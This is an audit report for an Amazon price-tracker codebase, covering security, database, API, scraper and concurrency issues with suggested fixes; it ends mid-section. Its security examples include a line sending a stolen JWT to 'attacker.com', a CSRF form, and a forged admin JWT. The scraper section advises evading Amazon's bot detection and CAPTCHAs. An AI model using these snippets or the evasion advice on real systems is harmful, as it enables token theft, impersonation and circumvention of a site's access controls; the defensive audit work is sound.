# Improvements & Optimization Opportunities

**Date:** 2026-04-10
**Purpose:** Point-in-time audit of the Amazon Price Tracker codebase identifying potential issues, optimization opportunities, and areas for improvement. Each item includes current behavior analysis with code references, impact assessment, and concrete fix suggestions.

**Severity Scale:**
- **Critical** — Security vulnerability or data loss risk requiring immediate attention
- **High** — Significant limitation affecting reliability, scalability, or security
- **Medium** — Improvement that would meaningfully benefit the application
- **Low** — Nice-to-have optimization or best practice alignment

---

## 1. Security

The application implements core security fundamentals (bcrypt password hashing, JWT authentication, parameterized SQL queries, user data isolation). However, several areas could be hardened — particularly around CORS, token storage, and rate limiting — especially as the app moves toward multi-user production use.

### 1.1 `[High]` CORS Allows All Origins

**Current behavior:** The Express server accepts requests from any origin.

```typescript
// backend/src/server.ts:25-30
app.use(cors({
  origin: true,  // Allow all origins in development
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

**Impact:** Any website can make authenticated API requests on behalf of a logged-in user. If an attacker hosts a malicious page and a user visits it while logged in, the attacker's JavaScript can call the API with the user's credentials — reading their product data, triggering scrapes, modifying settings, or (for admins) managing other users.

**Example scenario:** A user visits `evil-site.com` while logged into the tracker. The page runs:
```javascript
fetch('https://tracker.example.com/api/products', {
  credentials: 'include',
  headers: { 'Authorization': 'Bearer ' + storedToken }
})
```
This succeeds because the server returns `Access-Control-Allow-Origin: evil-site.com`.

**Suggested fix:** Configure allowed origins from an environment variable with a safe default:
```typescript
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',')
  : ['http://localhost:5174'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS not allowed'));
    }
  },
  credentials: true,
}));
```

### 1.2 `[High]` JWT Stored in localStorage

**Current behavior:** The JWT token is stored in and read from `localStorage`.

```typescript
// frontend/src/contexts/AuthContext.tsx:43
const storedToken = localStorage.getItem('authToken');

// frontend/src/contexts/AuthContext.tsx:66
localStorage.setItem('authToken', response.token);
```

**Impact:** `localStorage` is accessible to any JavaScript running on the same origin. If an XSS vulnerability exists anywhere in the app (e.g., unsanitized user input rendered in the DOM, a compromised dependency, or a browser extension), the attacker can read the JWT and use it from any location — the token works until it expires (7 days by default).

**Example scenario:** A browser extension or injected script runs:
```javascript
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal?token=' + token);
```
The attacker now has full API access for up to 7 days.

**Suggested fix:** Move to `httpOnly` cookies for token storage. The backend sets the cookie on login:
```typescript
res.cookie('token', jwt, {
  httpOnly: true,    // JavaScript cannot read it
  secure: true,      // HTTPS only
  sameSite: 'strict', // No cross-site requests
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```
The frontend stops storing/sending tokens manually — the browser sends the cookie automatically. This requires updating the auth middleware to read from `req.cookies` instead of the `Authorization` header.

### 1.3 `[Medium]` No Rate Limiting on Login/Register

**Current behavior:** The `/api/auth/login` and `/api/auth/register` endpoints have no rate limiting. Only `/api/admin/*` and `/api/setup/*` routes are rate-limited.

```typescript
// backend/src/routes/admin.ts:10-16 — rate limited
const adminRateLimit = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
});

// backend/src/routes/auth.ts — NO rate limiter imported or applied
router.post('/login', async (req, res) => { ... });
router.post('/register', async (req, res) => { ... });
```

**Impact:** An attacker can attempt unlimited login attempts to brute-force passwords. With no delay or lockout, even a moderately strong password can be cracked given enough time. Similarly, unrestricted registration could be used to create spam accounts.

**Example scenario:** An automated script sends 1000 login attempts per second against a known username, cycling through a password dictionary. With no rate limiting, this runs unimpeded.

**Suggested fix:** Add rate limiting to auth routes:
```typescript
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20,                   // 20 attempts per window
  message: { error: 'Too many attempts. Please try again later.' },
  standardHeaders: true,
});

router.post('/login', authLimiter, async (req, res) => { ... });
router.post('/register', authLimiter, async (req, res) => { ... });
```

### 1.4 `[Medium]` No CSRF Protection

**Current behavior:** State-changing requests (POST, PUT, DELETE) have no CSRF token validation. The app relies on the `Authorization` header for authentication, which provides some implicit CSRF protection since browsers don't automatically send custom headers cross-origin. However, if CORS is permissive (see item 1.1) or if token storage moves to cookies (see item 1.2), CSRF becomes a real attack vector.

**Impact:** If CORS is fixed but tokens move to httpOnly cookies (recommended in item 1.2), cross-site requests would automatically include the cookie. Without CSRF protection, a malicious page could trigger state changes (delete products, change passwords) on behalf of a logged-in user.

**Example scenario:** After moving to httpOnly cookies, a page at `evil-site.com` includes:
```html
<form action="https://tracker.example.com/api/products/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>
```

**Suggested fix:** Implement the Synchronizer Token Pattern or use the `csurf` middleware (or its successor `csrf-csrf`). Alternatively, use the `SameSite=Strict` cookie attribute (as suggested in 1.2) which blocks cross-site cookie sending entirely — this is often sufficient for same-origin SPAs.

### 1.5 `[Medium]` JWT Secret Has a Working Default

**Current behavior:** The JWT secret defaults to a known string in development. The app warns but continues running.

```typescript
// backend/src/config.ts:32-39
const jwtSecret = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
if (isProduction && jwtSecret === 'your-secret-key-change-in-production') {
  console.error('FATAL: ...');
  process.exit(1);
}
if (jwtSecret === 'your-secret-key-change-in-production') {
  console.warn('WARNING: Using default JWT_SECRET...');
}
```

**Impact:** In development, any developer who knows the codebase can forge JWT tokens. If someone accidentally runs the dev config exposed to the network (e.g., via Tailscale without realizing), tokens can be forged by anyone who reads the source code. The production guard is good, but the dev default is still risky for Tailscale-accessible instances.

**Example scenario:** A developer runs the app on Tailscale without setting `NODE_ENV=production`. Another Tailscale user crafts a valid JWT:
```javascript
jwt.sign({ userId: 1, username: 'admin', role: 'ADMIN' },
         'your-secret-key-change-in-production', { expiresIn: '7d' });
```

**Suggested fix:** Generate a random secret on first run and persist it to a `.env` file or the database's `system_config` table. This way every installation has a unique secret even in development. The setup wizard could handle this automatically.

### 1.6 `[Low]` No Security Headers

**Current behavior:** No security-related HTTP headers are set. There's no Helmet middleware or manual header configuration.

**Impact:** The application is missing standard protections:
- No `Content-Security-Policy` — allows inline scripts, which aids XSS attacks
- No `X-Frame-Options` / `frame-ancestors` — the app can be embedded in iframes (clickjacking)
- No `Strict-Transport-Security` — browsers don't enforce HTTPS on subsequent visits
- No `X-Content-Type-Options` — browsers may MIME-sniff responses incorrectly

**Example scenario:** An attacker embeds the tracker in an iframe on their site, overlays invisible buttons, and tricks users into clicking actions they didn't intend (clickjacking).

**Suggested fix:** Install and configure Helmet:
```bash
npm install helmet
```
```typescript
import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      imgSrc: ["'self'", "https://m.media-amazon.com", "https://images-na.ssl-images-amazon.com"],
      scriptSrc: ["'self'"],
    },
  },
}));
```

### Recommended Next Steps
1. **Immediate:** Add rate limiting to `/api/auth/login` and `/api/auth/register` — low effort, high security impact
2. **Immediate:** Restrict CORS origins via environment variable — low effort, closes the biggest hole
3. **Short-term:** Add Helmet for security headers — one dependency, broad protection
4. **Medium-term:** Migrate token storage to httpOnly cookies with `SameSite=Strict` — closes XSS token theft and CSRF simultaneously
5. **Medium-term:** Auto-generate JWT secret on first run via setup wizard

---

## 2. Database & Storage

SQLite is a solid choice for this application's scale — single-file, zero-config, and fast for read-heavy workloads. The database layer uses parameterized queries throughout (good for security) and has a well-organized repo pattern. The main concerns are around unbounded growth, missing WAL mode for concurrent access, and query efficiency at scale.

### 2.1 `[High]` Price History Grows Unbounded

**Current behavior:** Every price change creates a new row in `price_history`. There is no retention policy, archival mechanism, or compaction strategy anywhere in the codebase.

```typescript
// backend/src/services/db/product-repo.ts:265-267
'SELECT * FROM price_history WHERE product_id = ? ORDER BY date DESC',
```

**Impact:** A product tracked daily for 2 years generates ~730 rows. At scale: 50 users x 80 products x 365 days = 1.46 million rows per year. Each row is ~100 bytes, so price_history alone reaches ~140MB/year. The `getPriceHistory()` query fetches ALL rows with no LIMIT — chart rendering slows as history grows. Database exports become impractically large.

**Example scenario:**
```sql
-- After 1 year with 50 users, 80 products avg:
SELECT COUNT(*) FROM price_history;
-- Result: ~1,460,000 rows

-- ProductDetail page runs this on every load:
SELECT * FROM price_history WHERE product_id = 42 ORDER BY date DESC;
-- Returns 730 rows when 20-30 would suffice for the chart
```

**Suggested fix:**
1. Add a `LIMIT` and date range to `getPriceHistory()`:
   ```typescript
   'SELECT * FROM price_history WHERE product_id = ? AND date >= ? ORDER BY date DESC LIMIT ?'
   ```
2. Add a `retention_days` setting to `system_config` (default: 365)
3. Create a scheduled cleanup job that deletes records older than the retention period
4. For long-term history, consider a compaction job: keep daily granularity for last 90 days, weekly averages beyond that

### 2.2 `[Medium]` SQLite Not in WAL Mode

**Current behavior:** No `PRAGMA journal_mode` is set anywhere. SQLite defaults to DELETE journal mode, which uses exclusive locks during writes — blocking all readers.

```typescript
// backend/src/services/db/migrations.ts — PRAGMA usage is only for table_info introspection:
const columns = await dbAll<{ name: string }>(db, 'PRAGMA table_info(users)');
// No PRAGMA journal_mode = WAL anywhere
```

**Impact:** When the scheduler writes price records (which can take minutes for large catalogs), all read queries (dashboard, product listing, search) are blocked until the write transaction completes. This causes visible latency spikes for users during scheduled updates.

**Example scenario:** The scheduler updates 100 products (~200 seconds). During this window, a user loading the dashboard triggers `SELECT` queries that wait behind the write lock. The page appears to hang.

**Suggested fix:** Enable WAL mode on database initialization:
```typescript
db.run('PRAGMA journal_mode = WAL');
db.run('PRAGMA busy_timeout = 5000'); // Wait up to 5s for locks instead of failing
```
WAL mode allows concurrent readers during writes. The tradeoff is slightly more disk usage (WAL + SHM files) and checkpoint overhead — negligible for this workload.

### 2.3 `[Medium]` No VACUUM Strategy

**Current behavior:** When products are deleted (including cascade-deleted price history), SQLite doesn't reclaim disk space. The database file only grows, never shrinks.

**Impact:** After bulk operations (e.g., deleting a user with hundreds of products, or cleaning up old data), the database file retains its peak size. Over time, this wastes disk space — the file may be 500MB but only contain 200MB of live data.

**Example scenario:** An admin deletes a test user who had 200 products with 2 years of price history (~146,000 rows deleted). The database file stays the same size. Over months of user churn, significant space is wasted.

**Suggested fix:** Add a periodic VACUUM or use auto_vacuum:
```typescript
// Option 1: Incremental auto-vacuum (set once, on DB creation)
db.run('PRAGMA auto_vacuum = INCREMENTAL');
// Then periodically:
db.run('PRAGMA incremental_vacuum(100)'); // Free 100 pages at a time

// Option 2: Manual VACUUM after large deletes (admin-triggered)
// Add a "Compact Database" button in the admin panel
```
Note: Full `VACUUM` requires temporarily doubling disk space and locks the database. Incremental is safer for a running application.

### 2.4 `[Medium]` getPriceHistory() Fetches All Rows

**Current behavior:** The product detail page loads the entire price history for a product with no pagination or date range.

```typescript
// backend/src/services/db/product-repo.ts:262-267
async getPriceHistory(productId: number): Promise<PriceHistory[]> {
  return dbAll<PriceHistory>(
    db,
    'SELECT * FROM price_history WHERE product_id = ? ORDER BY date DESC',
    [productId]
  );
},
```

**Impact:** For a product tracked for 2 years, this returns ~730 rows every time the detail page loads. The frontend chart (Recharts) renders all data points, which is slow and visually noisy — users typically care about the last 30-90 days.

**Example scenario:** A user clicks on a product tracked since launch. The API returns 730 price records. The chart tries to render 730 data points with tooltips and hover states. On mobile, this causes noticeable lag.

**Suggested fix:** Add optional query parameters for date range and limit:
```typescript
async getPriceHistory(productId: number, options?: { days?: number; limit?: number }): Promise<PriceHistory[]> {
  const days = options?.days ?? 90;
  const limit = options?.limit ?? 500;
  return dbAll<PriceHistory>(
    db,
    'SELECT * FROM price_history WHERE product_id = ? AND date >= date("now", ?) ORDER BY date DESC LIMIT ?',
    [productId, `-${days} days`, limit]
  );
},
```
Add a "Show all history" toggle on the frontend for users who want the full dataset.

### 2.5 `[Low]` Image URLs Never Refreshed

**Current behavior:** Product image URLs are scraped once when the product is added and stored in the `products` table. They're never updated, even during daily price scrapes.

**Impact:** Amazon CDN URLs can expire or change over time. After months, some product images may show broken image placeholders. The frontend has an `onError` fallback, but it results in a poor visual experience.

**Example scenario:** A product added 6 months ago has an image URL pointing to an expired Amazon CDN path. The thumbnail shows a broken image icon on the dashboard.

**Suggested fix:** During price updates, also scrape and compare the image URL. If it changed, update the `products` table. This adds minimal overhead since the page is already loaded for price scraping:
```typescript
if (scrapedImageUrl && scrapedImageUrl !== product.image_url) {
  await dbService.updateProductImage(product.id, scrapedImageUrl);
}
```

### 2.6 `[Low]` No Composite Index on price_history(product_id, date)

**Current behavior:** There's an index on `price_history(product_id)` but not on the combination of `product_id` and `date`.

```typescript
// backend/src/services/db/migrations.ts:314
'CREATE INDEX IF NOT EXISTS idx_product_id ON price_history(product_id)',
// No composite index with date
```

**Impact:** Queries that filter by both `product_id` and a date range (as suggested in item 2.4) would benefit from a composite index. Without it, SQLite uses the product_id index to find all rows for the product, then scans those rows to apply the date filter. For products with thousands of history records, this adds unnecessary I/O.

**Example scenario:**
```sql
-- With only idx_product_id, this does an index scan + row filter:
SELECT * FROM price_history WHERE product_id = 42 AND date >= '2025-01-01'
ORDER BY date DESC LIMIT 90;

-- With a composite index, it's a direct range scan:
CREATE INDEX idx_price_history_product_date ON price_history(product_id, date DESC);
```

**Suggested fix:** Add a composite index in migrations:
```typescript
'CREATE INDEX IF NOT EXISTS idx_price_history_product_date ON price_history(product_id, date DESC)',
```
The `DESC` ordering matches the typical query pattern (most recent first). This also covers the existing `product_id`-only queries, so `idx_product_id` could be removed to save write overhead.

### Recommended Next Steps
1. **Immediate:** Add `LIMIT` and date range to `getPriceHistory()` — quick fix, big impact on page load times
2. **Immediate:** Enable WAL mode — single PRAGMA, eliminates read blocking during writes
3. **Short-term:** Add the composite `(product_id, date DESC)` index — one migration line
4. **Medium-term:** Implement price history retention policy with a configurable `retention_days` setting
5. **Long-term:** Add admin-triggered VACUUM or auto-vacuum for disk space reclamation

---

## 3. Backend & API

The backend is well-structured with a clean separation between routes, services, and the database layer. Error responses are consistent (`{ error: "message" }` format throughout), and the codebase uses async/await cleanly. The main gaps are around request validation, connection draining on shutdown, and observability.

### 3.1 `[Medium]` No Request Validation Middleware

**Current behavior:** Each route handler manually checks for required fields with ad-hoc `if` statements. There's no schema validation layer.

```typescript
// backend/src/routes/auth.ts — manual checks repeated in every handler
if (!username || !password) {
  return res.status(400).json({ error: 'Username and password are required' });
}
if (username.length < 3) {
  return res.status(400).json({ error: 'Username must be at least 3 characters' });
}
if (password.length < 6) {
  return res.status(400).json({ error: 'Password must be at least 6 characters' });
}
```

**Impact:** Validation logic is duplicated across routes (e.g., ASIN validation in products.ts and config.ts). Missing validations are easy to introduce — there's no guarantee a new route will validate all inputs. Adding a new field to an endpoint means remembering to validate it manually.

**Example scenario:** A developer adds a new notification rule type but forgets to validate the `params` JSON structure. Malformed params get stored in the database and cause errors when the notification system tries to evaluate them.

**Suggested fix:** Introduce Zod for schema validation with a middleware wrapper:
```typescript
import { z } from 'zod';

const loginSchema = z.object({
  username: z.string().min(3).max(30),
  password: z.string().min(6),
});

function validate(schema: z.ZodSchema) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({ error: result.error.issues[0].message });
    }
    req.body = result.data;
    next();
  };
}

router.post('/login', validate(loginSchema), async (req, res) => { ... });
```

### 3.2 `[Medium]` Graceful Shutdown Doesn't Drain Connections

**Current behavior:** SIGTERM/SIGINT handlers stop the scheduler and exit immediately. In-flight HTTP requests and active SSE connections are dropped.

```typescript
// backend/src/server.ts:119-129
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  schedulerService.stop();
  process.exit(0);
});
```

**Impact:** If the server is restarted during a price update (which can run for minutes), the update is interrupted mid-way. SSE clients get a broken connection with no completion signal. Any in-flight API requests return network errors.

**Example scenario:** A PM2 restart or systemd reload sends SIGTERM while 50 products are being updated. The scraper stops mid-product, the browser process may be orphaned, and the client sees "connection reset."

**Suggested fix:** Use `server.close()` to stop accepting new connections and drain existing ones:
```typescript
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  schedulerService.stop();
  server.close(() => {
    scraperService.close().then(() => {
      console.log('All connections drained, exiting.');
      process.exit(0);
    });
  });
  // Force exit after 30s if drain doesn't complete
  setTimeout(() => process.exit(1), 30_000);
});
```

### 3.3 `[Low]` No API Versioning

**Current behavior:** All endpoints are under `/api/` with no version prefix. Any breaking change to the API affects all clients immediately.

**Impact:** Low for a self-hosted application with a single frontend. If an external client (mobile app, browser extension, third-party tool) ever integrates with the API, breaking changes would require coordinated deployments.

**Suggested fix:** Not urgent — only becomes relevant if the API is opened to third-party consumers. If needed, prefix routes with `/api/v1/` and maintain backwards compatibility when introducing `/api/v2/`.

### 3.4 `[Low]` Health Endpoint Doesn't Check Live DB Connectivity

**Current behavior:** The `/health` endpoint checks a boolean flag (`dbReady`) set once during startup after migrations complete. It doesn't test live database connectivity.

```typescript
// backend/src/server.ts:54-56
app.get('/health', (req, res) => {
  res.json({ status: dbReady ? 'ok' : 'starting' });
});
```

**Impact:** If the SQLite file becomes corrupted, the disk fills up, or the file is moved/deleted after startup, the health endpoint still returns `{ status: 'ok' }`. Load balancers or monitoring systems would not detect the failure.

**Suggested fix:** Add a lightweight DB query to the health check:
```typescript
app.get('/health', async (req, res) => {
  if (!dbReady) return res.json({ status: 'starting' });
  try {
    await dbAll(db, 'SELECT 1');
    res.json({ status: 'ok' });
  } catch {
    res.status(503).json({ status: 'unhealthy' });
  }
});
```

### 3.5 `[Low]` No Request ID for Log Correlation

**Current behavior:** Log entries use `console.log` with timestamps (via the logger utility) but have no request ID or correlation token. Each log line is independent.

**Impact:** When debugging an issue from logs, there's no way to trace a specific user request across multiple log entries (e.g., auth check → product fetch → scraper call → database write). In a multi-user environment, interleaved log lines from concurrent requests are difficult to separate.

**Suggested fix:** Add a simple request ID middleware:
```typescript
import { randomUUID } from 'crypto';

app.use((req, res, next) => {
  req.id = randomUUID().slice(0, 8);
  res.setHeader('X-Request-ID', req.id);
  next();
});
```
Then include `req.id` in log messages. This is low priority but becomes valuable as user count grows.

### Recommended Next Steps
1. **Short-term:** Fix graceful shutdown to drain connections and close the scraper browser
2. **Short-term:** Add Zod validation to auth and product routes — the most field-heavy endpoints
3. **Long-term:** Add request IDs if log analysis becomes difficult with multiple concurrent users
4. **Deferred:** API versioning — only if third-party API consumers are planned

---

## 4. Scraper

The scraper is the most complex and robust part of the application. It uses Playwright Firefox with a multi-method fallback chain for price extraction, handles availability detection in both Portuguese and English, and extracts categories from breadcrumbs. The main concerns are around scalability (single browser instance), detection avoidance (browser/UA mismatch), and resilience (CAPTCHA recovery).

### 4.1 `[High]` Single Browser Instance — Bottleneck and SPOF

**Current behavior:** One Playwright browser is shared across all users and all operations. Products are scraped sequentially with a 2-second delay between each.

```typescript
// backend/src/services/scraper.ts:5-6
private browser: Browser | null = null;
private context: BrowserContext | null = null;

// Only one browser, reused:
async initialize(): Promise<void> {
  if (!this.browser) {
    this.browser = await firefox.launch({ headless: true });
    this.context = await this.browser.newContext({ ... });
  }
}
```

**Impact:** With 50 users x 80 products, a full system update takes: 4,000 products x (4s page load + 2s delay) = ~6.7 hours. If the browser crashes mid-update, all remaining products are skipped. During manual updates, one user's request blocks all others (see also Section 5: Concurrency).

**Example scenario:** The midnight scheduler starts processing User A's 100 products. At product #30, Playwright throws a browser crash error. The entire update fails — Users B through Z get no updates that night.

**Suggested fix:** Implement a browser pool with configurable concurrency:
```typescript
class ScraperPool {
  private pool: Browser[] = [];
  private maxBrowsers = parseInt(process.env.SCRAPER_CONCURRENCY || '2');

  async acquire(): Promise<{ browser: Browser; context: BrowserContext }> {
    // Return an available browser or launch a new one (up to max)
    // Isolate contexts per user for cookie/session separation
  }

  async release(browser: Browser): Promise<void> {
    // Return browser to pool or close if pool is full
  }
}
```
Even going from 1 to 2 concurrent browsers cuts update time in half. Each user's scrape runs in an isolated browser context to prevent session cross-contamination.

### 4.2 `[Medium]` Fixed 2-Second Delay Between Products

**Current behavior:** A hardcoded 2-second delay is applied between every product scrape, regardless of Amazon's response behavior.

```typescript
// backend/src/services/scheduler.ts:185
await new Promise(resolve => setTimeout(resolve, 2000));
```

**Impact:** The delay is either too aggressive (Amazon may still rate-limit at 2s intervals for large batches) or too conservative (if Amazon responds quickly and doesn't show rate-limiting signals, time is wasted). There's no backoff on errors — if a request gets a 503 or timeout, the next request fires 2 seconds later with the same intensity.

**Example scenario:** After scraping 200 products, Amazon starts returning 503 responses. The scraper retries at the same 2-second pace, gets blocked, and fails the remaining products.

**Suggested fix:** Implement adaptive delay with exponential backoff:
```typescript
let delay = 2000; // Base delay
const MIN_DELAY = 1500;
const MAX_DELAY = 30000;

// On success: gradually reduce delay (min 1.5s)
delay = Math.max(MIN_DELAY, delay * 0.9);

// On error/rate-limit: double delay (max 30s)
delay = Math.min(MAX_DELAY, delay * 2);

await new Promise(resolve => setTimeout(resolve, delay));
```

### 4.3 `[Medium]` No Proxy Support

**Current behavior:** All requests originate from the server's IP address. There's no proxy configuration in the Playwright launch options.

**Impact:** With a single IP, Amazon can easily identify and block the scraper once request volume increases. This is especially relevant for multi-user setups where hundreds of products are scraped from one address.

**Example scenario:** After consistently scraping 500+ products from one IP over several weeks, Amazon blocks the IP entirely. All scraping stops, affecting every user.

**Suggested fix:** Add proxy support via environment variable:
```typescript
const proxyConfig = process.env.SCRAPER_PROXY
  ? { server: process.env.SCRAPER_PROXY }
  : undefined;

this.browser = await firefox.launch({
  headless: true,
  proxy: proxyConfig,
});
```
For advanced setups, support a proxy list with rotation — but even a single proxy is an improvement over direct connection, as it separates the server's operational IP from the scraping IP.

### 4.4 `[Medium]` CAPTCHA Detection Without Recovery

**Current behavior:** The scraper detects CAPTCHAs by checking page text but throws an error with no recovery mechanism.

```typescript
// backend/src/services/scraper.ts:97-99
const bodyText = await page.textContent('body');
if (bodyText && (bodyText.toLowerCase().includes('captcha') ||
    bodyText.toLowerCase().includes('robot') ||
    bodyText.toLowerCase().includes('verify'))) {
  throw new Error('Amazon is showing a captcha or blocking the request');
}
```

**Impact:** When a CAPTCHA is triggered, the current product fails and the error is logged to the console. The 2-retry mechanism (`retries` parameter) will attempt the same page again — which will likely show the same CAPTCHA. No administrator is notified, and the scraper doesn't adjust its behavior (e.g., increasing delays or pausing).

**Example scenario:** Amazon starts showing CAPTCHAs after 100 products. The remaining 300 products all fail with retry exhaustion. The admin doesn't know until they check logs manually the next day.

**Suggested fix:**
1. On CAPTCHA detection, pause scraping and increase delay significantly (e.g., 5-minute cooldown)
2. Log CAPTCHA events to a dedicated counter in `system_config` for admin visibility
3. Add an admin notification (using the existing notification system) when CAPTCHA rate exceeds a threshold
4. Consider rotating the browser context (clear cookies, get new session) after CAPTCHA

### 4.5 `[Medium]` Firefox Browser with Chrome User-Agent

**Current behavior:** The scraper launches Firefox but sends a Chrome user-agent string.

```typescript
// backend/src/services/scraper.ts:12-13
this.browser = await firefox.launch({ headless: true });
this.context = await this.browser.newContext({
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
});
```

**Impact:** Sophisticated bot detection (which Amazon uses) can fingerprint the browser engine via JavaScript APIs (`navigator.plugins`, `navigator.webdriver`, WebGL renderer strings, CSS feature queries). A Firefox browser reporting itself as Chrome creates a detectable inconsistency. This makes it easier for Amazon to identify and block the scraper.

**Example scenario:** Amazon's bot detection runs:
```javascript
// Server-side check: UA says Chrome, but...
navigator.userAgent // "Chrome/120..."
CSS.supports('selector(::-moz-range-thumb)') // true (Firefox-only)
// Mismatch detected → flag as bot
```

**Suggested fix:** Either:
1. **Match UA to browser:** Use a Firefox user-agent string:
   ```
   Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
   ```
2. **Or switch to Chromium:** Since the UA claims Chrome, launch Chromium instead of Firefox. Chromium is generally better for avoiding detection because Chrome is the most common browser.

### 4.6 `[Low]` Hardcoded for Amazon.com.br

**Current behavior:** The scraper URL, price parsing (Brazilian Real format), and availability patterns (Portuguese) are all hardcoded for Amazon Brazil.

**Impact:** Users who want to track products from other Amazon regions (US, UK, DE, etc.) cannot do so without modifying the source code. This limits the app's usefulness for international users.

**Suggested fix:** Make the region configurable via `system_config`:
```typescript
const region = await getConfig('scraper.region') || 'com.br';
const url = `https://www.amazon.${region}/dp/${asin}`;
```
This would also require locale-aware price parsing (different decimal/thousands separators) and language-specific availability patterns. This is a significant effort — only worth pursuing if there's user demand.

### 4.7 `[Low]` Broken Selectors Not Surfaced to Admin

**Current behavior:** When a CSS selector fails and the scraper falls back to the next method, it logs to the console but doesn't record the event anywhere persistent.

**Impact:** If Amazon changes their page structure and a primary selector breaks, the scraper silently falls back to less reliable methods. Over time, all selectors could break one by one without anyone noticing until prices stop being extracted entirely.

**Suggested fix:** Track selector success rates in `system_config` or a dedicated stats table. Surface them in the admin System Stats panel:
```
Price selectors:  .a-price.priceToPay (92%) | #corePrice (6%) | fallback (2%)
Title selectors:  #productTitle (99%) | h1.a-size-large (1%)
```
Alert the admin when the primary selector drops below a threshold (e.g., 80% success rate).

### Recommended Next Steps
1. **Immediate:** Match user-agent to the actual browser engine (Firefox UA or switch to Chromium)
2. **Short-term:** Add CAPTCHA recovery with cooldown + admin notification
3. **Short-term:** Implement adaptive delay with exponential backoff
4. **Medium-term:** Add proxy support via environment variable
5. **Long-term:** Browser pool for concurrent scraping (pairs with concurrency improvements in Section 5)

---

## 5. Multi-User Concurrency

The application supports multiple users with proper data isolation at the database level (all queries scoped to `user_id`). However, the operational layer — scraping, scheduling, and real-time updates — was built for single-user patterns and doesn't scale well with concurrent users. The main bottlenecks are the global update lock and synchronous scraping tied to HTTP requests.

### 5.1 `[High]` Global Update Lock Blocks All Users

**Current behavior:** A single `isUpdating` boolean prevents any concurrent price updates. When one user triggers an update or the scheduler runs, all other update requests are rejected.

```typescript
// backend/src/services/scheduler.ts:9
private isUpdating: boolean = false;

// backend/src/services/scheduler.ts:81-86
if (this.isUpdating) {
  const message = 'Price update already in progress, skipping...';
  console.log(message);
  onProgress?.({ status: 'skipped', errorMessage: message });
  return;
}
```

**Impact:** In a multi-tenant setup, one user scraping 100 products (100 x 6s = ~10 minutes) locks out every other user from updating. The scheduled daily update (~4,000 products for 50 users) blocks manual updates for hours. Users see "Price update already in progress" with no visibility into whose update is running or when it will finish.

**Example scenario:** User A manually triggers an update for their 80 products at 11:55 PM. The midnight scheduler fires at 12:00 AM, hits `isUpdating = true`, and skips the entire system update. All users miss their nightly price check.

**Suggested fix:** Replace with a per-user lock map:
```typescript
private updatingUsers: Set<number> = new Set();

async updateUserPrices(userId: number, onProgress?: ProgressCallback) {
  if (this.updatingUsers.has(userId)) {
    onProgress?.({ status: 'skipped', errorMessage: 'Your update is already in progress' });
    return;
  }
  this.updatingUsers.add(userId);
  try {
    // ... scrape user's products
  } finally {
    this.updatingUsers.delete(userId);
  }
}
```
This allows multiple users to update simultaneously (each using their own browser context from the pool in Section 4.1).

### 5.2 `[High]` No Job Queue — Synchronous Inline Scraping

**Current behavior:** When a user clicks "Update Prices", the HTTP request handler directly calls `schedulerService.updateUserPrices()`, which scrapes all products synchronously while streaming SSE progress. The request stays open for the entire duration.

```typescript
// backend/src/routes/prices.ts:48-60
schedulerService.updateUserPrices(req.userId, sendProgress)
  .then(() => {
    sendProgress({ status: 'complete' });
    res.end();
  })
  .catch((error) => {
    sendProgress({ status: 'error', ... });
    res.end();
  });
```

**Impact:** A price update for 100 products holds an HTTP connection open for ~10 minutes. If the client disconnects (browser close, network change), the request continues running but progress is lost. There's no way to resume, check status, or queue multiple updates.

**Example scenario:** A user triggers an update on mobile, then closes the browser to save battery. The update continues server-side but the SSE connection is broken. The user reopens the app — there's no way to see if the update is still running or what progress was made.

**Suggested fix:** Decouple the update from the HTTP request using a simple job queue:
1. POST `/api/prices/update` creates a job and returns `{ jobId }` immediately
2. GET `/api/prices/update/:jobId/status` (or SSE) streams progress from the running job
3. Jobs run in the background, independent of HTTP connections
4. Progress state stored in memory (or SQLite for persistence across restarts)

For this project's scale, a simple in-memory queue with a `Map<string, JobState>` is sufficient — no need for Redis or BullMQ.

### 5.3 `[Medium]` Scheduler Processes Users Sequentially

**Current behavior:** The `updateAllPrices()` method iterates through all users one at a time, processing each user's products before moving to the next.

**Impact:** Total scheduler time is O(users x products_per_user). With 50 users averaging 80 products: 50 x 80 x 6s = ~6.7 hours for a full system update. This means the nightly update may not finish before the next one is scheduled.

**Example scenario:** The scheduler runs at midnight with 50 users. It takes 6+ hours, finishing at 6:30 AM. By then, prices may have already changed for products scraped early in the run, and the next midnight schedule fires in just 17.5 hours.

**Suggested fix:** Process multiple users in parallel (bounded by the browser pool size from Section 4.1):
```typescript
async updateAllPrices() {
  const users = await dbService.getAllUsers();
  const concurrency = parseInt(process.env.SCRAPER_CONCURRENCY || '3');

  // Process users in batches
  for (let i = 0; i < users.length; i += concurrency) {
    const batch = users.slice(i, i + concurrency);
    await Promise.all(batch.map(user => this.updateUserPrices(user.id)));
  }
}
```

### 5.4 `[Medium]` SSE Connections Not Cleaned Up on Disconnect

**Current behavior:** When a client connects to the price update SSE stream, there is no `req.on('close')` handler. If the client disconnects, the server continues scraping and calling `res.write()` on a closed connection.

```typescript
// backend/src/routes/prices.ts — SSE setup with no close handler
res.setHeader('Content-Type', 'text/event-stream');
res.setHeader('Cache-Control', 'no-cache');
